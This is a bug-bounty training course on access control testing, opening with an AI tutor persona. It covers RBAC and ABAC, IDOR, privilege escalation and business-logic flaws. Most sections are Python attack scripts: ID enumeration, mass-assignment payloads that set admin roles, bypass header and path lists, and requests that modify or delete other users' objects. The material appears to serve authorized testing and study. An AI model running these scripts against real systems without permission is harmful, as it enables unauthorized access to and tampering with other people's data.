You are an elite Authorization and Access Control Learning AI, specializing in teaching comprehensive access management security. Your expertise focuses on educating bug bounty hunters about IDOR vulnerabilities, privilege escalation, role-based access control, and broken access control patterns.

Your mission is to guide aspiring security researchers through access control complexities, teaching them systematic approaches to testing authorization mechanisms, identifying privilege escalation opportunities, and developing secure access control implementations.

Key Learning Objectives:
- **Access Control Models**: Master RBAC, ABAC, and MAC authorization systems
- **IDOR Vulnerability Detection**: Learn insecure direct object reference identification
- **Privilege Escalation Testing**: Understand vertical and horizontal privilege escalation
- **Object-Level Authorization**: Test ownership validation and resource access controls
- **Function-Level Access Control**: Assess administrative function exposure
- **Data-Level Security**: Verify proper data access restrictions
- **Access Control Bypass**: Study parameter manipulation and request tampering

Advanced Learning Concepts:
- **Mass Assignment Vulnerabilities**: Learn over-posting and parameter binding attacks
- **Direct API Access**: Test frontend restrictions bypassing through direct API calls
- **Session Context Analysis**: Assess access control enforcement across user sessions
- **Race Condition Exploitation**: Identify TOCTOU flaws in access decisions
- **Cache Poisoning**: Manipulate cached access control decisions
- **Header-Based Bypass**: Test access control through custom header manipulation
- **Business Logic Integration**: Understand access control in complex workflows

Learning Process:
1. **Authorization Fundamentals**: Understand access control principles and models
2. **IDOR Mastery**: Learn systematic object reference testing techniques
3. **Privilege Escalation**: Study vertical and horizontal escalation methodologies
4. **Access Control Testing**: Practice comprehensive authorization assessment
5. **Bypass Techniques**: Learn various access control circumvention methods
6. **Business Logic Integration**: Test access controls in complex application workflows
7. **Secure Implementation**: Learn proper access control design patterns

Teaching Methodology:
- **Model Breakdown**: Detailed analysis of different authorization models
- **IDOR Labs**: Hands-on insecure direct object reference testing
- **Privilege Escalation**: Step-by-step privilege escalation attack methodologies
- **Access Control Testing**: Comprehensive authorization mechanism assessment
- **Bypass Workshops**: Practical access control bypass technique training
- **Case Study Analysis**: Real-world authorization vulnerability examples
- **Implementation Guides**: Secure access control system design principles

Output Format:
- **Authorization Modules**: Structured learning units for access control concepts
- **IDOR Exercises**: Practical insecure direct object reference testing labs
- **Privilege Escalation**: Step-by-step privilege escalation tutorials
- **Access Control Assessment**: Comprehensive authorization testing guides
- **Bypass Techniques**: Access control circumvention methodology training
- **Case Studies**: Real-world authorization vulnerability analysis
- **Implementation Framework**: Secure access control design and implementation

Example Learning Query: "Teach me authorization and access control security testing from beginner to expert"

Ensure learning materials are comprehensive, practical, and focused on developing expert-level access control security assessment skills.

---

## Module 1: Access Control Models

### 1.1 Role-Based Access Control (RBAC)

RBAC assigns permissions to roles, and users are assigned to roles.

**RBAC Testing Script:**
```python
import requests

def test_rbac(base_url, role_tokens):
    """Test RBAC implementation across different roles"""
    
    admin_endpoints = [
        "/api/admin/users",
        "/api/admin/config",
        "/api/admin/stats",
        "/api/admin/delete-user",
    ]
    
    user_endpoints = [
        "/api/user/profile",
        "/api/user/settings",
        "/api/user/data",
    ]
    
    for role, token in role_tokens.items():
        headers = {"Authorization": f"Bearer {token}"}
        
        print(f"\n[*] Testing role: {role}")
        
        for endpoint in admin_endpoints:
            resp = requests.get(f"{base_url}{endpoint}", headers=headers)
            status = "ACCESSIBLE" if resp.status_code == 200 else "DENIED"
            print(f"  {endpoint}: {status} ({resp.status_code})")
        
        for endpoint in user_endpoints:
            resp = requests.get(f"{base_url}{endpoint}", headers=headers)
            status = "ACCESSIBLE" if resp.status_code == 200 else "DENIED"
            print(f"  {endpoint}: {status} ({resp.status_code})")

# Usage
role_tokens = {
    "admin": "admin_token_here",
    "user": "user_token_here",
    "guest": "guest_token_here",
}
test_rbac("https://api.target.com", role_tokens)
```

**RBAC Hierarchy Testing:**
```python
def test_rbac_hierarchy(base_url, tokens):
    """Test if lower roles can access higher role permissions"""
    
    # Test if user can access admin functions
    user_token = tokens.get('user')
    headers = {"Authorization": f"Bearer {user_token}"}
    
    # Test direct access
    resp = requests.get(f"{base_url}/api/admin/users", headers=headers)
    if resp.status_code == 200:
        print("[!] User can access admin endpoint!")
    
    # Test via parameter manipulation
    resp = requests.post(
        f"{base_url}/api/user/role",
        json={"role": "admin"},
        headers=headers
    )
    if resp.status_code == 200:
        print("[!] User can escalate role via parameter!")
```

### 1.2 Attribute-Based Access Control (ABAC)

ABAC makes access decisions based on attributes of the subject, resource, and environment.

**ABAC Testing:**
```python
def test_abac(base_url, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    # Test with different attribute values
    test_cases = [
        {"department": "admin"},
        {"clearance": "top_secret"},
        {"location": "headquarters"},
        {"time": "off_hours"},
    ]
    
    for attributes in test_cases:
        resp = requests.post(
            f"{base_url}/api/access/check",
            json=attributes,
            headers=headers
        )
        if resp.status_code == 200:
            print(f"[+] Access granted with attributes: {attributes}")
    
    # Test attribute manipulation
    resp = requests.get(
        f"{base_url}/api/resource",
        headers={**headers, "X-User-Department": "admin"}
    )
    if resp.status_code == 200:
        print("[!] ABAC bypass via header manipulation!")
```

### 1.3 Access Control Testing Framework

```python
class AccessControlTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.results = []
    
    def test_endpoint(self, endpoint, method, token, expected_status):
        headers = {"Authorization": f"Bearer {token}"}
        resp = requests.request(
            method,
            f"{self.base_url}{endpoint}",
            headers=headers,
            timeout=10
        )
        
        result = {
            "endpoint": endpoint,
            "method": method,
            "status": resp.status_code,
            "expected": expected_status,
            "pass": resp.status_code == expected_status
        }
        self.results.append(result)
        return result
    
    def generate_report(self):
        print("\n[*] Access Control Test Report")
        print("=" * 60)
        
        passed = sum(1 for r in self.results if r['pass'])
        failed = len(self.results) - passed
        
        print(f"Total Tests: {len(self.results)}")
        print(f"Passed: {passed}")
        print(f"Failed: {failed}")
        
        if failed > 0:
            print("\n[!] Failed Tests:")
            for r in self.results:
                if not r['pass']:
                    print(f"  {r['method']} {r['endpoint']}: "
                          f"Expected {r['expected']}, Got {r['status']}")
```

### 1.4 Practical Exercise: Access Control Model Testing

**Objective:** Test RBAC and ABAC implementation security.

**Test Cases:**
1. Test role hierarchy enforcement
2. Test attribute-based access decisions
3. Test role escalation via parameter manipulation
4. Test default role permissions
5. Test role assignment bypass

---

## Module 2: IDOR Vulnerabilities

### 2.1 IDOR Fundamentals

IDOR occurs when an application uses user-supplied input to access objects directly.

**IDOR Testing Methodology:**
```python
def test_idor_comprehensive(base_url, token, resource_type):
    """Comprehensive IDOR testing"""
    
    headers = {"Authorization": f"Bearer {token}"}
    
    # Test 1: Sequential IDs
    print("[*] Testing sequential IDs...")
    for i in range(1, 100):
        resp = requests.get(
            f"{base_url}/api/{resource_type}/{i}",
            headers=headers
        )
        if resp.status_code == 200:
            print(f"[!] IDOR found: {resource_type}/{i}")
    
    # Test 2: UUID patterns
    print("[*] Testing UUID patterns...")
    import uuid
    for _ in range(10):
        fake_uuid = str(uuid.uuid4())
        resp = requests.get(
            f"{base_url}/api/{resource_type}/{fake_uuid}",
            headers=headers
        )
        if resp.status_code == 200:
            print(f"[!] IDOR found with UUID: {fake_uuid}")
    
    # Test 3: Encoded IDs
    print("[*] Testing encoded IDs...")
    encoded_ids = [
        base64.b64encode(b"1").decode(),
        "1%00",  # Null byte
        "1%0a",  # Newline
        "1..",  # Path traversal
    ]
    for encoded_id in encoded_ids:
        resp = requests.get(
            f"{base_url}/api/{resource_type}/{encoded_id}",
            headers=headers
        )
        if resp.status_code == 200:
            print(f"[!] IDOR with encoded ID: {encoded_id}")
```

### 2.2 IDOR via Different Parameter Types

**Testing Various Parameter Locations:**
```python
def test_idor_parameters(base_url, token, resource_id):
    headers = {"Authorization": f"Bearer {token}"}
    
    # Test 1: Path parameter
    resp1 = requests.get(
        f"{base_url}/api/users/{resource_id}",
        headers=headers
    )
    
    # Test 2: Query parameter
    resp2 = requests.get(
        f"{base_url}/api/users?id={resource_id}",
        headers=headers
    )
    
    # Test 3: Body parameter
    resp3 = requests.post(
        f"{base_url}/api/users/get",
        json={"id": resource_id},
        headers=headers
    )
    
    # Test 4: Header parameter
    resp4 = requests.get(
        f"{base_url}/api/users",
        headers={**headers, "X-User-Id": str(resource_id)}
    )
    
    # Test 5: Cookie parameter
    session = requests.Session()
    session.cookies.set("user_id", str(resource_id))
    resp5 = session.get(f"{base_url}/api/users", headers=headers)
    
    results = {
        "path": resp1.status_code,
        "query": resp2.status_code,
        "body": resp3.status_code,
        "header": resp4.status_code,
        "cookie": resp5.status_code,
    }
    
    for param_type, status in results.items():
        if status == 200:
            print(f"[!] IDOR via {param_type} parameter")
    
    return results
```

### 2.3 IDOR in Different Contexts

**File-Based IDOR:**
```python
def test_file_idor(base_url, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    # Test file access
    files = [
        "/api/files/1",
        "/api/documents/user1/report.pdf",
        "/api/exports/data.csv",
        "/api/uploads/image.png",
    ]
    
    for file_path in files:
        resp = requests.get(f"{base_url}{file_path}", headers=headers)
        if resp.status_code == 200:
            print(f"[+] File accessible: {file_path}")
            
            # Try to access other user's files
            modified_path = file_path.replace("user1", "user2")
            resp2 = requests.get(f"{base_url}{modified_path}", headers=headers)
            if resp2.status_code == 200:
                print(f"[!] IDOR: Can access other user's file: {modified_path}")
```

### 2.4 Mass Assignment (Over-Posting)

```python
def test_mass_assignment(base_url, token):
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    
    # Normal user update
    normal_data = {"name": "John", "email": "john@example.com"}
    
    # Malicious update with extra fields
    malicious_data = {
        "name": "John",
        "email": "john@example.com",
        "role": "admin",
        "is_admin": True,
        "user_id": 2,  # Target another user
        "verified": True,
        "balance": 1000000,
    }
    
    # Test normal update
    resp1 = requests.put(
        f"{base_url}/api/user/profile",
        json=normal_data,
        headers=headers
    )
    
    # Test mass assignment
    resp2 = requests.put(
        f"{base_url}/api/user/profile",
        json=malicious_data,
        headers=headers
    )
    
    if resp2.status_code == 200:
        # Check if extra fields were applied
        resp3 = requests.get(f"{base_url}/api/user/profile", headers=headers)
        user_data = resp3.json()
        
        if user_data.get('role') == 'admin':
            print("[!] Mass assignment: role escalated to admin!")
        if user_data.get('is_admin') == True:
            print("[!] Mass assignment: is_admin set to true!")
```

### 2.5 Practical Exercise: IDOR Detection

**Objective:** Identify and test IDOR vulnerabilities.

**Methodology:**
1. Enumerate all resource identifiers
2. Test with different user accounts
3. Test parameter manipulation
4. Test path traversal in IDs
5. Document all IDOR findings

---

## Module 3: Privilege Escalation

### 3.1 Vertical Privilege Escalation

**Admin Function Discovery:**
```python
def test_vertical_escalation(base_url, user_token):
    headers = {"Authorization": f"Bearer {user_token}"}
    
    admin_endpoints = [
        "/api/admin",
        "/api/admin/users",
        "/api/admin/settings",
        "/api/internal",
        "/api/system",
        "/api/debug",
        "/api/config",
        "/api/backup",
    ]
    
    for endpoint in admin_endpoints:
        resp = requests.get(f"{base_url}{endpoint}", headers=headers)
        if resp.status_code == 200:
            print(f"[!] Admin function accessible: {endpoint}")
            
            # Try POST
            resp2 = requests.post(f"{base_url}{endpoint}", headers=headers)
            if resp2.status_code == 200:
                print(f"[!] Admin function POST accessible: {endpoint}")
```

### 3.2 Horizontal Privilege Escalation

**Cross-User Resource Access:**
```python
def test_horizontal_escalation(base_url, token, target_user_id):
    headers = {"Authorization": f"Bearer {token}"}
    
    # Test accessing other user's data
    endpoints = [
        f"/api/users/{target_user_id}",
        f"/api/users/{target_user_id}/profile",
        f"/api/users/{target_user_id}/settings",
        f"/api/users/{target_user_id}/data",
        f"/api/users/{target_user_id}/orders",
    ]
    
    for endpoint in endpoints:
        resp = requests.get(f"{base_url}{endpoint}", headers=headers)
        if resp.status_code == 200:
            print(f"[!] Horizontal escalation: {endpoint}")
            
            # Try to modify
            resp2 = requests.put(
                f"{base_url}{endpoint}",
                json={"name": "hacked"},
                headers=headers
            )
            if resp2.status_code == 200:
                print(f"[!] Can modify other user's data: {endpoint}")
```

### 3.3 Parameter Pollution for Escalation

```python
def test_parameter_pollution(base_url, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    # Test array parameters
    data = {
        "user_id": [1, 2],  # Array injection
        "role": "admin",
    }
    
    resp = requests.post(
        f"{base_url}/api/user/update",
        json=data,
        headers=headers
    )
    
    # Test duplicate parameters
    resp2 = requests.post(
        f"{base_url}/api/user/update",
        data="user_id=1&user_id=2&role=admin",
        headers={**headers, "Content-Type": "application/x-www-form-urlencoded"}
    )
    
    # Test JSON array injection
    json_data = {
        "user_id": {"$gt": ""},  # MongoDB injection
        "role": "admin",
    }
    
    resp3 = requests.post(
        f"{base_url}/api/user/update",
        json=json_data,
        headers=headers
    )
```

### 3.4 Practical Exercise: Privilege Escalation Testing

**Objective:** Test privilege escalation vulnerabilities.

**Test Cases:**
1. Test vertical escalation to admin functions
2. Test horizontal escalation across users
3. Test parameter manipulation for role changes
4. Test default permissions
5. Test role assignment bypass

---

## Module 4: Function-Level Access Control

### 4.1 Hidden Function Discovery

```python
def discover_hidden_functions(base_url, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    # Common admin paths
    admin_paths = [
        "/admin", "/admin/", "/admin/dashboard",
        "/api/admin", "/api/admin/", "/api/admin/users",
        "/internal", "/internal/", "/internal/api",
        "/debug", "/debug/", "/debug/vars",
        "/system", "/system/", "/system/config",
        "/management", "/management/", "/management/beans",
        "/actuator", "/actuator/", "/actuator/env",
    ]
    
    for path in admin_paths:
        resp = requests.get(f"{base_url}{path}", headers=headers)
        if resp.status_code not in [404, 403]:
            print(f"[+] Function found: {path} ({resp.status_code})")
            
            # Test all HTTP methods
            for method in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']:
                resp2 = requests.request(
                    method,
                    f"{base_url}{path}",
                    headers=headers
                )
                if resp2.status_code == 200:
                    print(f"    {method}: ACCESSIBLE")
```

### 4.2 HTTP Method Authorization

```python
def test_method_authorization(base_url, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    endpoints = [
        "/api/user/profile",
        "/api/user/settings",
        "/api/user/delete",
    ]
    
    for endpoint in endpoints:
        print(f"\n[*] Testing {endpoint}")
        for method in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']:
            resp = requests.request(
                method,
                f"{base_url}{endpoint}",
                headers=headers
            )
            print(f"  {method}: {resp.status_code}")
```

### 4.3 Practical Exercise: Function-Level Testing

**Objective:** Test function-level access control.

**Test Cases:**
1. Discover hidden admin functions
2. Test HTTP method restrictions
3. Test function-level authorization
4. Test endpoint enumeration
5. Test API documentation exposure

---

## Module 5: Object-Level Authorization

### 5.1 Object Reference Testing

```python
def test_object_references(base_url, token, object_type):
    headers = {"Authorization": f"Bearer {token}"}
    
    # Get list of objects
    resp = requests.get(f"{base_url}/api/{object_type}", headers=headers)
    if resp.status_code == 200:
        objects = resp.json()
        
        for obj in objects:
            obj_id = obj.get('id')
            
            # Test direct access
            resp2 = requests.get(
                f"{base_url}/api/{object_type}/{obj_id}",
                headers=headers
            )
            
            # Test ownership validation
            if resp2.status_code == 200:
                # Try to modify
                resp3 = requests.put(
                    f"{base_url}/api/{object_type}/{obj_id}",
                    json={"name": "modified"},
                    headers=headers
                )
                
                # Try to delete
                resp4 = requests.delete(
                    f"{base_url}/api/{object_type}/{obj_id}",
                    headers=headers
                )
                
                print(f"Object {obj_id}: GET={resp2.status_code}, "
                      f"PUT={resp3.status_code}, DELETE={resp4.status_code}")
```

### 5.2 Ownership Validation Testing

```python
def test_ownership_validation(base_url, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    # Get user's own resources
    resp = requests.get(f"{base_url}/api/user/resources", headers=headers)
    if resp.status_code == 200:
        my_resources = resp.json()
        
        # Try to access as different user
        # (use different token)
        other_token = "other_user_token"
        other_headers = {"Authorization": f"Bearer {other_token}"}
        
        for resource in my_resources:
            resp2 = requests.get(
                f"{base_url}/api/resources/{resource['id']}",
                headers=other_headers
            )
            if resp2.status_code == 200:
                print(f"[!] Ownership bypass: Resource {resource['id']}")
```

### 5.3 Practical Exercise: Object-Level Authorization

**Objective:** Test object-level authorization security.

**Test Cases:**
1. Test object reference manipulation
2. Test ownership validation
3. Test object access across users
4. Test object modification permissions
5. Test object deletion permissions

---

## Module 6: Access Control Bypass

### 6.1 Header-Based Bypass

```python
def test_header_bypass(base_url, token):
    base_headers = {"Authorization": f"Bearer {token}"}
    
    # Common bypass headers
    bypass_headers = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Host": "localhost"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Original-URL": "/api/admin"},
        {"X-Rewrite-URL": "/api/admin"},
    ]
    
    for bypass_header in bypass_headers:
        headers = {**base_headers, **bypass_header}
        
        resp = requests.get(
            f"{base_url}/api/admin",
            headers=headers
        )
        if resp.status_code == 200:
            print(f"[!] Bypass works: {bypass_header}")
```

### 6.2 URL Path Bypass

```python
def test_path_bypass(base_url, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    # Path traversal bypasses
    paths = [
        "/api/admin",
        "/api/admin/",
        "/api/admin//",
        "/api/./admin",
        "/api/admin/.",
        "/api/admin;/",
        "/api/admin%20",
        "/api/admin%09",
        "/api/admin..;/",
        "/api/admin",
        "/API/ADMIN",  # Case variation
        "/api/Admin",
    ]
    
    for path in paths:
        resp = requests.get(f"{base_url}{path}", headers=headers)
        if resp.status_code == 200:
            print(f"[+] Path bypass: {path}")
```

### 6.3 HTTP Verb Tampering

```python
def test_verb_tampering(base_url, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    # Test if different methods have different authorization
    endpoints = [
        "/api/user/profile",
        "/api/admin/users",
        "/api/settings",
    ]
    
    for endpoint in endpoints:
        print(f"\n[*] Testing {endpoint}")
        for method in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']:
            resp = requests.request(
                method,
                f"{base_url}{endpoint}",
                headers=headers
            )
            print(f"  {method}: {resp.status_code}")
```

### 6.4 Practical Exercise: Access Control Bypass

**Objective:** Test various access control bypass techniques.

**Test Cases:**
1. Test header-based bypass
2. Test URL path bypass
3. Test HTTP verb tampering
4. Test case variation bypass
5. Test encoding bypass

---

## Module 7: Business Logic Access Control

### 7.1 Workflow Authorization Testing

```python
def test_workflow_authorization(base_url, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    # Test order workflow
    order_flow = [
        ("POST", "/api/orders", {"item": "test", "quantity": 1}),
        ("PUT", "/api/orders/1/status", {"status": "approved"}),
        ("POST", "/api/orders/1/ship", {"tracking": "123"}),
        ("POST", "/api/orders/1/complete", {}),
    ]
    
    for method, endpoint, data in order_flow:
        resp = requests.request(
            method,
            f"{base_url}{endpoint}",
            json=data,
            headers=headers
        )
        print(f"{method} {endpoint}: {resp.status_code}")
        
        # Test if can skip steps
        if resp.status_code == 200:
            # Try to complete without approval
            resp2 = requests.post(
                f"{base_url}/api/orders/1/complete",
                headers=headers
            )
            if resp2.status_code == 200:
                print(f"[!] Workflow bypass: Can complete without approval")
```

### 7.2 State Manipulation

```python
def test_state_manipulation(base_url, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    # Test state machine bypass
    states = ["draft", "pending", "approved", "rejected", "completed"]
    
    for state in states:
        resp = requests.put(
            f"{base_url}/api/orders/1",
            json={"status": state},
            headers=headers
        )
        if resp.status_code == 200:
            print(f"[+] State manipulation: Set to {state}")
```

### 7.7 Practical Exercise: Business Logic Testing

**Objective:** Test business logic access control.

**Test Cases:**
1. Test workflow step skipping
2. Test state manipulation
3. Test amount/quantity manipulation
4. Test discount/coupon abuse
5. Test referral/credit manipulation

---

## Assessment Questions

### Knowledge Check

1. **What is the difference between horizontal and vertical privilege escalation?**
   - A) Horizontal is same role, different user; Vertical is different role
   - B) They are the same
   - C) Horizontal is admin access; Vertical is user access
   - D) Horizontal is API access; Vertical is web access

2. **IDOR vulnerabilities occur when:**
   - A) Passwords are weak
   - B) Object references are exposed to users
   - C) Sessions are not invalidated
   - D) MFA is not implemented

3. **Mass assignment vulnerabilities allow attackers to:**
   - A) Bypass authentication
   - B) Modify unauthorized fields
   - C) Execute arbitrary code
   - D) Bypass rate limiting

4. **Header-based access control bypass targets:**
   - A) Client-side validation
   - B) IP-based access restrictions
   - C) Database queries
   - D) Frontend JavaScript

5. **Business logic access control testing focuses on:**
   - A) Technical vulnerabilities
   - B) Workflow manipulation
   - C) Network security
   - D) Physical security

### Practical Assessment

**Scenario:** You discover a web application with user and admin roles. Test the access control implementation.

**Tasks:**
1. Test RBAC implementation across 5 endpoints
2. Identify 1 IDOR vulnerability
3. Test privilege escalation via parameter manipulation
4. Test function-level access control bypass
5. Test business logic workflow manipulation

---

## Further Reading

### Resources
- OWASP Authorization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html
- OWASP IDOR Prevention: https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference
- CWE-284: Improper Access Control: https://cwe.mitre.org/data/definitions/284.html
- CWE-639: Authorization Bypass: https://cwe.mitre.org/data/definitions/639.html
- Testing Guide: https://owasp.org/www-project-web-security-testing-guide/

### Tools
- Burp Suite: Authorization testing
- Autorize: Burp extension for access control testing
- RBAC Tester: Custom authorization testing
- IDOR Detector: Automated IDOR detection

### Practice Platforms
- DVWA: Access control vulnerabilities
- Juice Shop: Modern web app with authz flaws
- WebGoat: OWASP learning platform
- HackTheBox: Authorization-focused challenges
- PortSwigger Web Security Academy: Authorization labs
